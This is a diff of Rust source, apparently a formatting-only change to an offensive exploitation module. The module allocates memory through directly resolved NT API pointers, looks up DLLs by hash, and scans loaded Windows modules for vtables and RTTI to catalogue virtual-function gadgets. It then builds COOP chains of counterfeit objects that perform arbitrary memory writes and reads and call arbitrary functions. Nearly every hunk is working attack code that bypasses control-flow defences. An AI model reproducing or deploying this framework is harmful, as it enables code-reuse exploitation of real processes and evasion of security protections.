@@ -283,16 +283,15 @@ unsafe fn allocate_rw_memory(size: usize) -> Result<usize, &'static str> {
     let mut base: usize = 0;
     let mut region_size: usize = size;
 
-    type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
-        usize, *mut usize, usize, *mut usize, u32, u32,
-    ) -> i32;
+    type NtAllocateVirtualMemoryFn =
+        unsafe extern "system" fn(usize, *mut usize, usize, *mut usize, u32, u32) -> i32;
 
     let func: NtAllocateVirtualMemoryFn = std::mem::transmute(func_addr);
 
     let status = func(
         (-1isize) as usize, // Current process
         &mut base,
-        0,                  // ZeroBits
+        0, // ZeroBits
         &mut region_size,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE,
@@ -314,17 +313,11 @@ unsafe fn free_memory(mut base: usize) {
 
     let mut region_size: usize = 0;
 
-    type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
-        usize, *mut usize, *mut usize, u32,
-    ) -> i32;
+    type NtFreeVirtualMemoryFn =
+        unsafe extern "system" fn(usize, *mut usize, *mut usize, u32) -> i32;
 
     let func: NtFreeVirtualMemoryFn = std::mem::transmute(func_addr);
-    let _ = func(
-        (-1isize) as usize,
-        &mut base,
-        &mut region_size,
-        MEM_RELEASE,
-    );
+    let _ = func((-1isize) as usize, &mut base, &mut region_size, MEM_RELEASE);
 }
 
 // ─── PE Section Parsing ───────────────────────────────────────────────────
@@ -360,9 +353,7 @@ unsafe fn find_section(module_base: usize, section_name: &[u8]) -> Option<(usize
         }
         // If we matched the full search string and the next byte is null
         // or we matched all 8 bytes.
-        if match_len == section_name.len()
-            && (match_len >= 8 || name[match_len] == 0)
-        {
+        if match_len == section_name.len() && (match_len >= 8 || name[match_len] == 0) {
             let va = (*sec).virtual_address as usize;
             let vsize = (*sec).virtual_size as usize;
             return Some((module_base + va, vsize));
@@ -457,12 +448,8 @@ fn estimate_n_args(code: &[u8]) -> usize {
     // REX.W sub rsp, imm32: 48 81 EC XX XX XX XX
     for i in 0..code.len().saturating_sub(7) {
         if code[i] == 0x48 && code[i + 1] == 0x81 && code[i + 2] == 0xEC {
-            let frame_size = u32::from_le_bytes([
-                code[i + 3],
-                code[i + 4],
-                code[i + 5],
-                code[i + 6],
-            ]) as usize;
+            let frame_size =
+                u32::from_le_bytes([code[i + 3], code[i + 4], code[i + 5], code[i + 6]]) as usize;
             // Each stack arg beyond the 4 register args takes 8 bytes.
             // Add 4 for the register parameters (rcx, rdx, r8, r9).
             if frame_size > 0x20 {
@@ -491,12 +478,15 @@ fn estimate_n_args(code: &[u8]) -> usize {
 /// Scans the .rdata section for contiguous arrays of function pointers that
 /// point into the module's .text section.  For each vtable candidate,
 /// attempts to resolve the class name via RTTI structures.
-pub fn analyze_vtables(module_base: usize, module_name: &str) -> Result<Vec<VtableInfo>, &'static str> {
+pub fn analyze_vtables(
+    module_base: usize,
+    module_name: &str,
+) -> Result<Vec<VtableInfo>, &'static str> {
     unsafe {
-        let (text_start, text_size) = find_section(module_base, b".text")
-            .ok_or("cannot find .text section")?;
-        let (rdata_start, rdata_size) = find_section(module_base, b".rdata")
-            .ok_or("cannot find .rdata section")?;
+        let (text_start, text_size) =
+            find_section(module_base, b".text").ok_or("cannot find .text section")?;
+        let (rdata_start, rdata_size) =
+            find_section(module_base, b".rdata").ok_or("cannot find .rdata section")?;
 
         let text_end = text_start + text_size;
         let rdata_end = rdata_start + rdata_size;
@@ -513,7 +503,9 @@ pub fn analyze_vtables(module_base: usize, module_name: &str) -> Result<Vec<Vtab
             // Count consecutive code pointers pointing into .text.
             while offset + PTR_SIZE <= rdata_size {
                 let ptr = u64::from_le_bytes(
-                    rdata[offset..offset + PTR_SIZE].try_into().unwrap_or([0; 8]),
+                    rdata[offset..offset + PTR_SIZE]
+                        .try_into()
+                        .unwrap_or([0; 8]),
                 ) as usize;
 
                 if ptr >= text_start && ptr < text_end {
@@ -538,10 +530,7 @@ pub fn analyze_vtables(module_base: usize, module_name: &str) -> Result<Vec<Vtab
                 let vtable_addr = rdata_start + vtable_file_offset;
 
                 // Try to resolve class name via RTTI.
-                let class_name = resolve_rtti_class_name(
-                    vtable_addr,
-                    module_base,
-                );
+                let class_name = resolve_rtti_class_name(vtable_addr, module_base);
 
                 vtables.push(VtableInfo {
                     module_base,
@@ -654,9 +643,8 @@ impl CoopGadgetDb {
                 .unwrap_or("unknown")
                 .trim_end_matches('\0');
 
-            let dll_base = unsafe {
-                pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(dll_name))
-            };
+            let dll_base =
+                unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(dll_name)) };
 
             let dll_base = match dll_base {
                 Some(b) => b,
@@ -674,14 +662,13 @@ impl CoopGadgetDb {
                 }
             };
 
-            tracing::info!(
-                "coop: found {} vtable(s) in {}",
-                vtables.len(),
-                name_str
-            );
+            tracing::info!("coop: found {} vtable(s) in {}", vtables.len(), name_str);
 
             for vt in vtables {
-                let class_name = vt.class_name.clone().unwrap_or_else(|| "Unknown".to_string());
+                let class_name = vt
+                    .class_name
+                    .clone()
+                    .unwrap_or_else(|| "Unknown".to_string());
 
                 for slot in 0..vt.entry_count {
                     let func_ptr_addr = vt.vtable_addr + slot * PTR_SIZE;
@@ -694,10 +681,7 @@ impl CoopGadgetDb {
                     // Classify the function.
                     let (behavior, n_args) = unsafe { classify_function(func_addr) };
 
-                    let func_name = format!(
-                        "{}_vfn_{}_{:#x}",
-                        class_name, slot, func_addr
-                    );
+                    let func_name = format!("{}_vfn_{}_{:#x}", class_name, slot, func_addr);
 
                     let idx = gadgets.len();
                     by_behavior.entry(behavior).or_default().push(idx);
@@ -917,7 +901,8 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
         match op {
             CoopOperation::WriteMem { address, value } => {
                 // Find a StoreArg0 gadget.
-                let gadget = db.find_gadget(GadgetBehavior::StoreArg0)
+                let gadget = db
+                    .find_gadget(GadgetBehavior::StoreArg0)
                     .ok_or("no StoreArg0 gadget available")?;
 
                 // Build a counterfeit object where:
@@ -930,8 +915,8 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
                     CounterfeitObject::create(
                         gadget.vtable_addr,
                         &[
-                            (PTR_SIZE, *address),             // field at +0x08: target address
-                            (PTR_SIZE * 2, *value),           // field at +0x10: value to write
+                            (PTR_SIZE, *address),   // field at +0x08: target address
+                            (PTR_SIZE * 2, *value), // field at +0x10: value to write
                         ],
                     )?
                 };
@@ -950,14 +935,15 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
 
             CoopOperation::ReadMem { address } => {
                 // Find a LoadArg0 gadget.
-                let gadget = db.find_gadget(GadgetBehavior::LoadArg0)
+                let gadget = db
+                    .find_gadget(GadgetBehavior::LoadArg0)
                     .ok_or("no LoadArg0 gadget available")?;
 
                 let obj = unsafe {
                     CounterfeitObject::create(
                         gadget.vtable_addr,
                         &[
-                            (PTR_SIZE, *address),             // field at +0x08: address to read
+                            (PTR_SIZE, *address), // field at +0x08: address to read
                         ],
                     )?
                 };
@@ -973,9 +959,14 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
                 objects.push(obj);
             }
 
-            CoopOperation::CallFunc { address, arg1, arg2 } => {
+            CoopOperation::CallFunc {
+                address,
+                arg1,
+                arg2,
+            } => {
                 // Find a CallArg0 gadget.
-                let gadget = db.find_gadget(GadgetBehavior::CallArg0)
+                let gadget = db
+                    .find_gadget(GadgetBehavior::CallArg0)
                     .ok_or("no CallArg0 gadget available")?;
 
                 // Build an object where a field holds the function pointer.
@@ -983,9 +974,9 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
                     CounterfeitObject::create(
                         gadget.vtable_addr,
                         &[
-                            (PTR_SIZE, *address),             // field at +0x08: function to call
-                            (PTR_SIZE * 2, *arg1),            // field at +0x10: arg1
-                            (PTR_SIZE * 3, *arg2),            // field at +0x18: arg2
+                            (PTR_SIZE, *address),  // field at +0x08: function to call
+                            (PTR_SIZE * 2, *arg1), // field at +0x10: arg1
+                            (PTR_SIZE * 3, *arg2), // field at +0x18: arg2
                         ],
                     )?
                 };
@@ -1002,7 +993,8 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
             }
 
             CoopOperation::Arithmetic { op, a, b } => {
-                let gadget = db.find_gadget(GadgetBehavior::Arithmetic)
+                let gadget = db
+                    .find_gadget(GadgetBehavior::Arithmetic)
                     .ok_or("no Arithmetic gadget available")?;
 
                 let (val_a, val_b) = match op {
@@ -1014,10 +1006,7 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
                 let obj = unsafe {
                     CounterfeitObject::create(
                         gadget.vtable_addr,
-                        &[
-                            (PTR_SIZE, val_a),
-                            (PTR_SIZE * 2, val_b),
-                        ],
+                        &[(PTR_SIZE, val_a), (PTR_SIZE * 2, val_b)],
                     )?
                 };
 
@@ -1035,12 +1024,11 @@ pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'st
             }
 
             CoopOperation::NoOp => {
-                let gadget = db.find_gadget(GadgetBehavior::NoOp)
+                let gadget = db
+                    .find_gadget(GadgetBehavior::NoOp)
                     .ok_or("no NoOp gadget available")?;
 
-                let obj = unsafe {
-                    CounterfeitObject::create(gadget.vtable_addr, &[])?
-                };
+                let obj = unsafe { CounterfeitObject::create(gadget.vtable_addr, &[])? };
 
                 tracing::debug!(
                     "coop: chain step {} — NoOp via {} from {}",
@@ -1157,8 +1145,14 @@ pub fn get_stats() -> CoopStats {
     CoopStats {
         db_initialized: DB_INITIALIZED.load(Ordering::Acquire),
         total_gadgets: GADGET_DB.get().map(|db| db.gadget_count()).unwrap_or(0),
-        behavior_counts: GADGET_DB.get().map(|db| db.behavior_counts()).unwrap_or_default(),
-        module_counts: GADGET_DB.get().map(|db| db.module_counts()).unwrap_or_default(),
+        behavior_counts: GADGET_DB
+            .get()
+            .map(|db| db.behavior_counts())
+            .unwrap_or_default(),
+        module_counts: GADGET_DB
+            .get()
+            .map(|db| db.module_counts())
+            .unwrap_or_default(),
     }
 }
 
